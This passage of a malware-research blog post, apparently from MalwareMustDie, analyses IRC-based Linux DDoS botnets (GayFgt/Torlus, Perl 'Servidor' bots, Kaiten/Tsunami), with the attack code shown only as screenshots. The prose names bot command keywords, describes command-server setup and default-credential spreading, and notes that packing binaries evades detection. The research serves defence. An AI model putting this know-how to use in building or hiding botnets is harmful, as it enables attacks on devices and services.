src=https:\/\/lh3.googleusercontent.com\/-G8NqwLL-ZZ8\/VwyNhoV2XgI\/AAAAAAAAUng\/9g3yNSuhLUkogsHa2wMA0WSVa6iVlaq4wCLcB\/s580\/009.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EAfter decoded and all strings loaded in memory, the functionalities will run as usual, here's the telnet scanner part as per PoC below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-IzrUalDDyjQ\/VwyOd5-cFgI\/AAAAAAAAUno\/0vZUVEeKxrQ96RTG-u-koQaABbBzH89fACLcB\/s1120\/009b.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-IzrUalDDyjQ\/VwyOd5-cFgI\/AAAAAAAAUno\/0vZUVEeKxrQ96RTG-u-koQaABbBzH89fACLcB\/s580\/009b.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EIn this type of \"crypted\" version (example: the BLJ type sample--\u003E\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/6c10a66a367f8207cfb092c2289ef0cf9279c9b78c8888d988c3cb03503b1eec\/analysis\/1462197098\/\"\u003Ehere\u003C\/a\u003E) is also the  persistent model of Torlus by its installation as autostart in user's crontab.  \u003Cp\u003ETip to all good folks who on reversing some of these crypted variant in the future: The point of differences are as follows: 1. \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-d2Gy7_lkpXw\/Vwu1BIVE7aI\/AAAAAAAAUmI\/s4IG03jzvLk8L0gwHGJU60fjumdMxRArgCCo\/s800-Ic42\/2001.PNG\" class=\"postlink\"\u003Ethe forks was run before decrypt\u003C\/a\u003E, 2. \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-zUkbtaZzg14\/Vwxr3ogY1QI\/AAAAAAAAUmU\/UrY6bmYeGQEKb-LvEe7wgFpUl_yVwsFCgCLcB\/s720\/001.PNG\" class=\"postlink\"\u003Esyscall stripped\u003C\/a\u003E but all are torlus' ones . \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-HWRTUhqGdJ0\/VwxsOM-or3I\/AAAAAAAAUmY\/Nrcm4zuHtGcAC-FiczpDDWxrnat-KjO8gCLcB\/s720\/003.PNG\" class=\"postlink\"\u003E3. Some hint: Aiming the args\u003C\/a\u003E which they never can hide. 4. \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Rf3mgPpXjCg\/Vwxs9kM_plI\/AAAAAAAAUms\/8gw9WPwRcXQXX5EfJRSvA_hPaW92hv3TQCLcB\/s720\/Capture.PNG\" class=\"postlink\"\u003EPut them back together\u003C\/a\u003E\u0026amp; you'll see torlus\/lizkebab\/gayfgt code as per it is.  \u003Cp\u003EFor the decryption of GayFgt\/Torlus\/LizKebab BLJ crypted version, I made a guide\/hint video that hopefully can help others dissecting this version: \u003Ciframe width=\"580\" height=\"435\" src=\"https:\/\/www.youtube.com\/embed\/pIr0nz4beu4?rel=0\u0026amp;showinfo=0\" frameborder=\"0\" allowfullscreen\u003E\u003C\/iframe\u003E\u003Cbr\u003E\u003Ci\u003E*)Noted: See this video in fullscreen \u0026 HD mode\u003C\/i\u003E\u003Cp\u003EThe LINUX version of AV has bad detection ratio:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-WGTzb0D2Nfg\/VydzSER5kmI\/AAAAAAAAU6g\/RoL5hYhEr_0mGYStLt37h0fT384XfqEGACLcB\/h120\/007.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-WGTzb0D2Nfg\/VydzSER5kmI\/AAAAAAAAU6g\/RoL5hYhEr_0mGYStLt37h0fT384XfqEGACLcB\/s580\/007.PNG\u003E\u003C\/a\u003E \u003Cp\u003EA message to skids who use this version: \u003Cb\u003E\u003Ci\u003E\"Try harder! :)\" \u003C\/i\u003E\u003C\/b\u003E \u003Cp\u003E\u003Cb\u003EThe Linux\/GayFgt distribution via vulnerable WebApps also exists\u003C\/b\u003E \u003Cp\u003EMost of the infection used for GatFgt or Kaiten are using hacked credential for the linux boxes, however, it is not always like that. We spotted the first large distribution in September 2014 during the bash exploitation \"shellshock\", after that default credential for busybox was aimed, later on they started to aim all platform of the IoT with its default credential, which then they are also hack FTP accounts with weak credential, and recently the CMS\/WebApps with vulnerabilities are aimed too to spread these ELF malware, one proof is the case we took screenshot on Wordpress hacked site:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-9pnWYe1qkms\/Vw9-kjEhyNI\/AAAAAAAAUts\/EWbvQbIDrTUbftdIAUnvYhYO--aA3FvIgCLcB\/s2120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-9pnWYe1qkms\/Vw9-kjEhyNI\/AAAAAAAAUts\/EWbvQbIDrTUbftdIAUnvYhYO--aA3FvIgCLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E \u003Ca name=\"servidor\"\u003E\u003Cp\u003E\u003Ch2\u003E3. The infamous legendary \u003Cb\u003E\"Servidor\" family IRC Perl DDoS bot (Pbot)\u003C\/b\u003E\u003C\/h2\u003E \u003C\/a\u003E \u003Cp\u003EWe all seeing this threat for a long time but recently this DDOS script is heavily used as \"alternative\" to infect IoT for DDOS purpose, in case that the ELF malware can not be run nor executed in the targeted platform by the hackers. Here's the proof in--\u003E\u003Ca href=\"https:\/\/pastebin.com\/Zwq0KxFA\"\u003Ehere\u003C\/a\u003E \u003Cp\u003EHistorically. Perl bot DDoS IRC (in short: known as PBot), is not a new problem, and we can see much of them in the compromised sites or FTP servers. I cover about those in previous post about FTP adventure in--\u003E[\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2014\/05\/a-journey-to-ftp-abused-sites-story-of.html\"\u003E-1-\u003C\/a\u003E] and [\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2014\/06\/a-journey-to-abused-ftp-sites-story-of.html\"\u003E-2-\u003C\/a\u003E]. Even though it seems there are many types of them, but the do-able codes are only two or three, others are basically just a combination \"copypasta\" of those codes. Even though the threat of Perl DDoS is old, the recent findings are having much \"improvement\" for the distribution and usage, for protection of the player on controlling their bots, along with camouflaging purpose avoiding the online scanning tools.  \u003Cp\u003EWhy Perl? Why not PHP or else like Python or Ruby? Some routers need a CGI to operate as user's interface, and many of routers distribution (still) prefer to have Perl interpreter for that interfacing language. Thus most of the servers are having Perl for execution of scripts in maintenance level, say: \/etc\/init.d\/update-rc.d for example. I am not checking down to its statistic details yet, but there were so many infection hitting IoT and servers in Perl backdoor instead of ELF during the shellshock boom era. Shortly, if ELF doesn't run, Perl bot might do the job, that was why they still use this type of bot, as a companion or even the main course. And in addition, it doesn't take much effort to modify Perl script for a skiddos actor.  \u003Cp\u003EOne major type of this Perl DDoS bot is the \u003Ci\u003E\"Servidor\" type\u003C\/i\u003E, which was originally coded with Portugese language made variables and comments. Some typical parts of this Perl DDoS is as per snipped below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-A0XH2a-R5eo\/VyWI0F-56EI\/AAAAAAAAU2Q\/FeiJw2pg_eYGAvMje4ZeglJ1Cp2AzO2vACLcB\/s2120\/002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-A0XH2a-R5eo\/VyWI0F-56EI\/AAAAAAAAU2Q\/FeiJw2pg_eYGAvMje4ZeglJ1Cp2AzO2vACLcB\/s580\/002.png\u003E\u003C\/a\u003E\u003Cbr\u003EThis version was used, being in \"plastic surgery\" to look like some other original made, and modified with many new \"copypasta\" functions, to look something like below picture, which the copypasta actor\/coder named it as Perl DDoS IRC bot or other generic variant names.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-OaHiUenkFeQ\/VyWI3wYx4pI\/AAAAAAAAU2U\/iQlgJ_dtzgYCWLkJ5DpPq23rfrcY5lJsACLcB\/s3120\/001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-OaHiUenkFeQ\/VyWI3wYx4pI\/AAAAAAAAU2U\/iQlgJ_dtzgYCWLkJ5DpPq23rfrcY5lJsACLcB\/s580\/001.png\u003E\u003C\/a\u003E \u003Cp\u003EThe thing about the perl code is, they are \u003Cb\u003Ereadable\u003C\/b\u003E, so what the hacktivists do is to obfuscate the text part as much as possible to hide it's server's information. In this case is the usage of the \"hexed text\" for obfuscation. And other variation (not so many) of obfuscation are also spotted too. \u003Cbr\u003EA snippet code for the threat:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-C1eFHQQfUh4\/VwyMqHV38RI\/AAAAAAAAUnY\/K23gwI_tXQUuqlXFlqRczY56EylQz0WOwCLcB\/s1120\/008.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-C1eFHQQfUh4\/VwyMqHV38RI\/AAAAAAAAUnY\/K23gwI_tXQUuqlXFlqRczY56EylQz0WOwCLcB\/s580\/008.PNG\u003E\u003C\/a\u003E \u003Cp\u003EThe flexibility obfuscation of the \"servidor\" Perl IRC DDoS botnet (PBot) as the backdoor has a very long history too, for another example: after PHPMyAdmin (PMA) remote execution exploitation was found \u0026 in the wild, the GayFgt\/Torlus coder was in purpose releasing a Tutorial to setup a PMA exploit botnet in PHP toolkit, with advising a download package contains Perl script to be executed as per instructed in the tutorial.   \u003Cp\u003EWhat was not said in the tutorial is.. during the execution, another base64 encoded \u003Cb\u003E\"unmentioned\" component \u003C\/b\u003Efile, which is actually containing the \"Servidor\" Perl Bot (PBot) code will be executed too, and that was obviously made \u003Cb\u003Eto backdoor\u003C\/b\u003E the person who was actually using the tutorial. Servidor (Pbot) and\/or in general: \"IRC botnet\", was proven as flexible and as easy to use for hacking\/backdoor purpose. Here's the screenshot of that code:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-dyCo2Izy1Uc\/VyYGlEKODJI\/AAAAAAAAU5Q\/NnuD0UcN6YIQ1A0CjAu4JGGwkCkGi3pDQCLcB\/s2120\/003.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-dyCo2Izy1Uc\/VyYGlEKODJI\/AAAAAAAAU5Q\/NnuD0UcN6YIQ1A0CjAu4JGGwkCkGi3pDQCLcB\/s580\/003.png\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ci\u003EHow PerlBot\/Pbot was applied as backdoor in the PHP botnet toolkit to hack PMA sites..skiddos are rude is it? :)\u003C\/i\u003E \u003Cp\u003EThe example CNC of these perl IRC botnet is as per shown in the picture below when the owner of large perl botnet call himself \"GoD\" bragged his stuff:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-M0edJJxFH0g\/VwyiwBs0H2I\/AAAAAAAAUo0\/e8wVJdBwsZQLom7zDzWRqEltlGjaFI_OgCLcB\/s2120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-M0edJJxFH0g\/VwyiwBs0H2I\/AAAAAAAAUo0\/e8wVJdBwsZQLom7zDzWRqEltlGjaFI_OgCLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E \u003Cp\u003EA set of infection for these \"servidor\" Perl DDoS'er is as widely applicable as the ELF Torlus(GayFgt) or ELF Kaiten\/STD has. The SkiDDoS can set the attacker's IP (they call it as \"spreader\") to a certain IP while using the Perl DDoS payload together with some ELF's one in the other IP and all of the (Perl \u0026 ELF) can use \u0026 share the same CNC in another IP too. They (skids) like to switch or combine between those IP, and it is important for us to clean up all of the used nodes in a chain of infection. Below is a real case data of such scenario:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-GoVSVEvufo8\/V2coB2zIjtI\/AAAAAAAAVa4\/OymKX22C304WikPPoYuOlx0mU-ki0zXAQCLcB\/s3120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-GoVSVEvufo8\/V2coB2zIjtI\/AAAAAAAAVa4\/OymKX22C304WikPPoYuOlx0mU-ki0zXAQCLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E \u003Cp\u003EIf you spotted such type of script please try to get the below information:\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-vs0jSZKRCHw\/VwyVIDhaCZI\/AAAAAAAAUn4\/KQRPQWFFqY0LCcbjpN7UZuqqbPR4Gtt-gCLcB\/s320\/Capture.PNG\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-8DDRLxVcDqU\/V0LFoNyB30I\/AAAAAAAAVNc\/qYOWvAHYdrYFQEJCZL6qqNC8Ok4JHrNVgCLcB\/s2120\/001.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-8DDRLxVcDqU\/V0LFoNyB30I\/AAAAAAAAVNc\/qYOWvAHYdrYFQEJCZL6qqNC8Ok4JHrNVgCLcB\/s580\/001.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EWhich is valuable information to \"secure\" such compromised\/cnc-utilized servers.  \u003Cp\u003EThere are also other type of Perl DDoS scripts that are privately distributed between \"fellow hacker team mate\" only, which were specifically built for the desired flood combination attacks that was thought \"effective\" by the coder\/user's preference, the below Perl script is the example for it:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-yTM8wHo4jzs\/VyWQ0__v6rI\/AAAAAAAAU2o\/_ukWtZqguYc0OSih1i_bOa6G1PKkWWD0ACLcB\/s2120\/003.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-yTM8wHo4jzs\/VyWQ0__v6rI\/AAAAAAAAU2o\/_ukWtZqguYc0OSih1i_bOa6G1PKkWWD0ACLcB\/s580\/003.png\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ci\u003E*) Note: See the \"skype\" part in the code. You think what I am thinking?\u003C\/i\u003E \u003Cp\u003ESome crooks in Lizard Squad, despite of using their ELF DDoS (GayFgt\/Torlus\/LizKebab) is also having their own private version of Perl DDoS script that seems are coded for the public usage for any other skiddies to use it during a mass operation they made to flood a certain big services, this simple script is one of the tool used during their \"adventures\", it is a simple coded in perl but I think you can imagine how big flood traffic that can be generated by bunch of kids (says.. 30 kids which each kids is having says 3-4 boxes bots) if firing this script in their boxes via CLI of Perl:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-vY3X65uAVn4\/VyWTzXuPl3I\/AAAAAAAAU20\/D5IzcXXA7ksXymAowUAfubATVjZoxsE0ACLcB\/s3120\/004.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-vY3X65uAVn4\/VyWTzXuPl3I\/AAAAAAAAU20\/D5IzcXXA7ksXymAowUAfubATVjZoxsE0ACLcB\/s580\/004.PNG\u003E\u003C\/a\u003E \u003Cp\u003E\u003Ch2\u003E4. Screenshots of \"other\" ELF IRC ddos variants with same basis\u003C\/h2\u003E \u003Cp\u003EThere are plenty more of ELF malware threat derived from the IRC basis client-server code. I will give some example of what was \"hot\" in the market and these samples were spotted and handled in the wild during our mission in MalwareMustDie helping to stop usage of ELF malware, in example:  \u003Cp\u003EMuBot, DTool, Lightaidra, Bossabot\/Line's tools, below is the screenshots:\u003Cbr\u003E \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-LTSQ45LUaVs\/VwygLbkwxmI\/AAAAAAAAUog\/_DGjqlEAHoYcskyL_SQUknbq2504kNGCACLcB\/s2120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-LTSQ45LUaVs\/VwygLbkwxmI\/AAAAAAAAUog\/_DGjqlEAHoYcskyL_SQUknbq2504kNGCACLcB\/s200\/Capture.PNG\u003E\u003C\/a\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-0i5ZL11eBrs\/VwyjpEmUL2I\/AAAAAAAAUo8\/JEXJY1xvfHMwBM1L5x1yPR_QjzM0xX0cgCLcB\/s2100\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-0i5ZL11eBrs\/VwyjpEmUL2I\/AAAAAAAAUo8\/JEXJY1xvfHMwBM1L5x1yPR_QjzM0xX0cgCLcB\/s200\/Capture.PNG\u003E\u003C\/a\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-WHYZuahV8-U\/Vw2lxAVhpkI\/AAAAAAAAUq4\/tLbc2hsYQvkyWLhAkEw8XmNPpzT3B96wwCLcB\/s2120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-WHYZuahV8-U\/Vw2lxAVhpkI\/AAAAAAAAUq4\/tLbc2hsYQvkyWLhAkEw8XmNPpzT3B96wwCLcB\/s200\/Capture.PNG\u003E\u003C\/a\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-p3g2ut536PM\/Vw2op533nVI\/AAAAAAAAUrI\/d338PicNEw0QBmAhw8WKx1dmXxB8zQaMwCLcB\/s2120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-p3g2ut536PM\/Vw2op533nVI\/AAAAAAAAUrI\/d338PicNEw0QBmAhw8WKx1dmXxB8zQaMwCLcB\/s200\/Capture.PNG\u003E\u003C\/a\u003E \u003Cp\u003EJust for the record only, a little out of context: During the investigation accidentally found that Anonymous hacktivists are also have their own original DDoS tool, but that was coded in Visual Studio .NET Framework with Visual Basic :-))\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-hnRwzc577hk\/VyWXz44QOJI\/AAAAAAAAU3A\/WFcPen1VI782IqEe1iLgN8fttoMaVcuDgCLcB\/s2120\/005.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-hnRwzc577hk\/VyWXz44QOJI\/AAAAAAAAU3A\/WFcPen1VI782IqEe1iLgN8fttoMaVcuDgCLcB\/s580\/005.png\u003E\u003C\/a\u003E\u003Cbr\u003EWell, it seems that they put harder effort in scripting its ASCII art than the coding itself :D  \u003Cbr\u003E\u003Cp\u003E\u003Cb\u003EHow the first infection was spread from the CNC?\u003C\/b\u003E \u003Cp\u003E\u003Ci\u003EDirect hacking to known vulnerable devices..\u003C\/i\u003E \u003Cp\u003EThis is the good question that was often asked. There are basically two way to do their first infection, first is scanning the vulnerability of the targeted victim's device and scan them via various online scanning devices tool in the internet and they gain access via known vulnerability, including defaut hardcoded credential setting. The below pic is \u003Cb\u003Ethe sample \u003C\/b\u003Eof known device scanned in the internet using one line short query that can initiate these post's mentioned hacks.\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/Xjjz-l72Koo3KKF6zNCkO6ETNe3VjIblfNzL_qLFG6MCM0VJJWO8HrMEFWLlUviiJcAQoj0n1MNqkQ=w555-h804-no\u003E \u003Cp\u003E\u003Ci\u003EHardcoded default SSH credential scanning script (perl, python, etc) hacks\u003C\/i\u003E \u003Cp\u003EIn this method, they automate SSH ccanning for the known vulnerable device with the default setting \/ hardcoded credential and then compromise the device to then download and install the malware by scripts. Below is the picture snapshot of the perl and python real scripts used by the skiddos to hack our internet of things:  \u003Cp\u003EThe Perl script base ELF malware \"spreader\"\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/h40kBcMq9qikuNqCMyV_ulp0FR7oCAYnQ4xHbNGDibepigoqze2U_Re5Ca_D5sgSUvCMgPS1oqkqeQ=w1400-h829-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/h40kBcMq9qikuNqCMyV_ulp0FR7oCAYnQ4xHbNGDibepigoqze2U_Re5Ca_D5sgSUvCMgPS1oqkqeQ=w555-h829-no\u003E\u003C\/a\u003E \u003Cp\u003EThe python script base ELF malware \"spreader\"\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/oroDzNHk-N7FLweVm7krYPNNeXP-DBq5-TJnjxHkEKE4VZRQ15UsAIYkwD0IWB-FeXqQ6uF0xdkRRg=w1161-h934-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/oroDzNHk-N7FLweVm7krYPNNeXP-DBq5-TJnjxHkEKE4VZRQ15UsAIYkwD0IWB-FeXqQ6uF0xdkRRg=w555-h934-no\u003E\u003C\/a\u003E \u003Cp\u003E\u003Ca name=\"tsunami\"\u003E\u003Cbr\u003E\u003Cp\u003E\u003Ch1\u003EEssay: Why \"kaiten\/tsunami\" IRC botnet family is (still) popular now?\u003C\/h1\u003E\u003C\/a\u003E \u003Cp\u003EThe kaiten\/Tsunami malware C code is openly shared in many \u003Ci\u003Eexploit database sites\u003C\/i\u003E for long. The origin of kaiten.c was coming from knight.c, coded firstly by Bysin (to then known as Contem) in around between 1999 (or earlier maybe) to 2000. The history of the kaiten is as per explained in here--\u003E\u003Ca href=\"https:\/\/www.reddit.com\/r\/netsec\/comments\/4exmhk\/a_bit_about_elfstd_irc_bot_x00s_cback_aka\/d24cl96\"\u003Ehere\u003C\/a\u003E. It is like a handbook for the youth hackers or skids to code and build any IRC bot in this and previous generation. I asked many times to put those codes to be taken down, since I see there are plenty of kaiten\/tsunami variant codes that are evolving and hacktivist's malware coders are making some modification to add more features to it everyday. This malware is used in some known groups now... Right now kaiten\/tsunami-base malware is already widely shared and improved, so to take the intial source code down now it is just meaningless anyway..  \u003Cp\u003EWhat had happened now: Most powerful DDoS that is hitting us daily today are these ELF botnets, via utilizing our NIX boxes and IoT devices to be used against us. The flexibility of this tool is high, you don't need to have root access to run these malware, and since it is coded in C, you can mostly compile them on-the-spot by your own downloaded preferred compilers to bypass the NIX system mitigation scheme of using the own native builder. Some of the skiddos are using the script automation for cross-compiling their botnet, as per seen in the real Qbot compiling script below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/lzrjRWiPwUY8utLA3_7ABRnpGbp9GDIgYx3OBh2G7SN1MqsK03Z-Kk8_-BFCO5pUCxgerluzrCxtDw=w1384-h947-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/lzrjRWiPwUY8utLA3_7ABRnpGbp9GDIgYx3OBh2G7SN1MqsK03Z-Kk8_-BFCO5pUCxgerluzrCxtDw=w580-h947-no\u003E\u003C\/a\u003E \u003Cp\u003EWe have a boom of trace for these incidents started during \u003Ci\u003Ethe shellshock era\u003C\/i\u003E, but back then the variant was not as much as now, which we are having about 6++ families (Kaiten\/STD\/Aidra\/LightAidra\/BossaLine\/Dtool\/Torlus or LizKebab)and around 17 variants of codes in the wild, old and new.  \u003Cp\u003EThe usage of the IRC bot is hiding the real actors connection with the malware implemented in the victim's machine behind a specifically setup IRC server. This is the advantage for those hackers. The bad actor just have to stealthy connect from any different network to that IRC server, which is an IRC server prepared for a botnet operational purpose, and wait until the \"spread method\" infected \u003Ci\u003Ebot nodes\u003C\/i\u003E automatically join the IRC authenticated channel. The spreading ways are varied, some are aiming busybox devices with hammering its credential for login, or using other malware to hack the telnet like GayFgt\/Torlus\/Lizkebab. \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-xZ0wRuJQnqs\/VwypiFniZpI\/AAAAAAAAUpU\/Lr45mtOaPtYd3m4CyIfaYPH6kkcRVYb-QCLcB\/s2120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-xZ0wRuJQnqs\/VwypiFniZpI\/AAAAAAAAUpU\/Lr45mtOaPtYd3m4CyIfaYPH6kkcRVYb-QCLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EThe hacker then can start to remotely control the activity in the victim's machine, to send via IRC protocol the commands that will execute malicious procedures coded in each (specific) malware.   \u003Cp\u003EThose commands sent are a simple \"IRC message\" specific textual visible keywords like: ATK (UDP|SYN|STD|XMAS|PAN), PING, SCAN, SHELL, BCONNECT, MAIL etc etc.. which can mean something like: multiple form DDoS attacking another nodes, scanning for infecting more nodes, getting the shell of the infected machine to be used as backdoor, getting updates, sending messages and many other malicious routines.  \u003Cbr\u003EThese keywords will be received and processed by the ELF malware to run the desired bad activity.  \u003Cp\u003EFor the DDoS function itself, it seems that DDoS Stresser Services based on GayFgt\/Torlus then Kaiten\/Tsunami are proven hit harder than similar kinds written in Perl, PHP, Python or Windows DDoS (what so called LOIC long time ago..) client or even Chinese made DDoSer malware. The flexibility in arrangement and renting its service \u003Ci\u003Eper \"channel\"\u003C\/i\u003E in their IRC server is the key of its \"easy-selling\", and for people who can do IRC chat means they are able to operate via these bots to hit whichever targets they are planning to.   \u003Cp\u003EThe most painful part of a malware coder is maybe in creating the CNC communication protocol.. in IRC bot they don't have to create that protocol, since IRC is and providing its protocol for the communication, and Tsunami code is having it all and a De Facto \"open source\". \u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-Z8C5Kw9RlWc\/VySX7ezIq1I\/AAAAAAAAU04\/ZcFLsCIKf1s19cOvbujcibmUQTKlvvFSgCLcB\/s580\/1005.PNG\u003E\u003Cbr\u003EThe code of these malware is also simple and among hackers who are mostly sharing its source codes, any specific modification can be done by them self who know a bit about C network programming with TCP\/IP and know about IRC protocol.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-g0EDcCNCi8c\/Vw6GuKAvmyI\/AAAAAAAAUsE\/yesf8JBddPQjfKnImw0CjVG_D0McxB5GQCLcB\/s2120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-g0EDcCNCi8c\/Vw6GuKAvmyI\/AAAAAAAAUsE\/yesf8JBddPQjfKnImw0CjVG_D0McxB5GQCLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EAt this point please don't get me wrong, I am not speaking highly on any malware and you know me well how I hate malware, but IRC channel base DDoS is the threat that we all should start to raise more attention and priority..now, or it's going to be too late.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-nTeI6UMgp0U\/Vw6H0epoD8I\/AAAAAAAAUsM\/cD5NEqvN5mEDx3KVubf3ngXnxjBeUSGswCLcB\/s2120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-nTeI6UMgp0U\/Vw6H0epoD8I\/AAAAAAAAUsM\/cD5NEqvN5mEDx3KVubf3ngXnxjBeUSGswCLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-99isBVHQ-XI\/Vw6IXqkoy1I\/AAAAAAAAUsQ\/YSnlAUnxepA9hTHa_VufulB4j-tCOzYwQCLcB\/s2120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-99isBVHQ-XI\/Vw6IXqkoy1I\/AAAAAAAAUsQ\/YSnlAUnxepA9hTHa_VufulB4j-tCOzYwQCLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E \u003Cp\u003EIn the nutshell where there is no \"hacker\" who is connected to internet without not hiding their real IP connection, the setup of the IRC botnet is \"heaven\" to avoid the direct trace during investigation upon incidents to gather evidence collective effort caused by it. The only way to spot the attacker is to get into the IRC server and get the information from that vector only, under some conditions: IF the data is saved or parsed in there, or.. if we can gain full access to the host served by the IRCd server, if these conditions met then most likely we will only see some bunch of IP addresses camouflaged in VPN or Tor connectivity. Yet, there is still some know-how that can done to compromise the CNC server to beat the actors \"by their own game\" with a method that I can not disclose further for our own OPSEC reason.  \u003Cp\u003EThe IRC server used itself, they \"mostly\" use two versions for this purpose (inspircd or unrealircd), can be implemented lightly in any VPS (rented or hacked ones), or in hack *NIX boxes or routers or IoT that were previously hacked and used for this purpose. the security for it is exists, they can auth the allowed connection, the server login, the channel to connect and the specific IRC accountS (noted: plural) to be master\/slave for the botnet operation. They can setup a hostname in DNS that points to the IRC server for changing its IP within each session of infection and\/or using the real IP to setup server-client set of infection itself. \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-5pE76QY3yv0\/Vw923M0oo2I\/AAAAAAAAUtc\/nvERhpU9q4wRARkzMxHJBBGB03466pgzACLcB\/s2102\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-5pE76QY3yv0\/Vw923M0oo2I\/AAAAAAAAUtc\/nvERhpU9q4wRARkzMxHJBBGB03466pgzACLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EMany scheme can be done. Better yet, the setup for servers to connect in kaiten\/tsunami code is just unlimited.   \u003Cp\u003ESo, actually this is a powerful scheme, that is being digged into its utmost usage right now, a light-weight basis botnets for building and re-building, to code and re-code it again and again, and it is an flexible\/easy\/useful tool for bad people to compromise then utilizing our nodes, specially if IoT nodes are aimed and being targeted. The telnet or ssh scanner function is also spotted in some variants used to spread more nodes too for infection. In some incidents I faced, the attacker will certainly choose to install his prepared ELF Tsunami IRC bot for the backdoor \/ hack purpose along with other hacktool like \u003Ci\u003Erootkits\u003C\/i\u003E.  \u003Cp\u003EMoreover, due to the ELF malware detection ratio is not as high as other form of executable, a simple stripping, packing, obfuscating and encoding for the ELF build itself will surely drop the detection ratio into a very minimum. THIS is the fact that you must know. As you can see all Anti Virus are depending on samples 100% in detecting these ELF. Not like with windows malware when they virus protection can have sandboxing or behavior analysis as add-value to detection.   \u003Cp\u003ETo produce tsunami\/kaiten ELF malware to attack IoT in multiplatform CPU is not that difficult, with the same code all bad guys need is just a cross compiler that can compile you samples to support most of IoT processor architecture or operating systems. As proof, below is the sample of recent detected version explaining what architecture of router's processor that is really on target now:\u003Cbr\u003E\u003Ca href=\"http:\/\/i.imgur.com\/O0i0FTp.jpg\"\u003E\u003Cimg src=http:\/\/i.imgur.com\/O0i0FTp.jpg width=500\u003E\u003C\/a\u003E\u003Cbr\u003Eor.. \u003Ca 